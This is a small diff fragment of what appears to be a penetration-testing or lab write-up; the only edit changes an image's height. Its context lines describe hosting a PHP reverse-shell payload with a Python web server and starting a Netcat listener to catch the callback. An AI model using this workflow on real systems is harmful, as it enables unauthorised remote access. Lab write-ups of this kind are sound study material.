@@ -51,7 +51,7 @@ Hosted the payload (php-reverse-shell.php) using Python:
 ```Bash
 python3 -m http.server 80
 ```
-<img width="300" height="100" alt="image" src="https://github.com/user-attachments/assets/2d30c56a-480a-48f7-825c-c026fd1e9ba5" />
+<img width="300" height="50" alt="image" src="https://github.com/user-attachments/assets/2d30c56a-480a-48f7-825c-c026fd1e9ba5" />
 
 Started a Netcat listener to catch the callback:
 ```Bash
